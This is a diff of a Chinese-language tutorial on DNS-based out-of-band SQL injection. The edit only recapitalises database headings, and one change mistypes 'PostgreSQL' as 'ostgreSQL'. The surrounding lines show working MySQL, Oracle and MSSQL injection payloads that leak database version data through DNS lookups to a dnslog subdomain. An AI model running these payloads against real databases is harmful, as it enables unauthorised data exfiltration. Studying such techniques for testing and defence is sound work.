@@ -18,7 +18,7 @@ re111.dnslog.cn 是你拥有的三级域名。
 ```
 select load_file(concat("\\\\",version(),".re111.dnslog.cn//1ndex.txt"));
 ```
-### 2.2 oracle
+### 2.2 Oracle
 #### 2.2.1 条件
 - 适用于联合注入或堆叠注入
 #### 2.2.2 利用
@@ -40,7 +40,7 @@ UTL_INADDR.GET_HOST_ADDRESS()
 SELECT HTTPURITYPE((SELECT * from v$version)||'.re111.dnslog.cn').GETCLOB() FROM sys.DUAL;
 ```
 
-### 2.3 mssql
+### 2.3 MSSQL
 #### 2.3.1 条件
 - Winodows
 - 适用于联合注入或堆叠注入
@@ -55,7 +55,7 @@ id=1;DECLARE @host varchar(1024);SELECT @host=(SELECT SERVERPROPERTY('edition'))
 ```
 id=1;DECLARE @host varchar(1024);SELECT @host=(SELECT SERVERPROPERTY('edition'))%2b'.re111.dnslog.cn'; EXEC('master..xp_subdirs "\'%2b@host%2b'\foobar$"');
 ```
-### 2.4 postgreSQL
+### 2.4 ostgreSQL
 #### 2.4.1 条件
 - Windows
 - 适用于堆叠注入
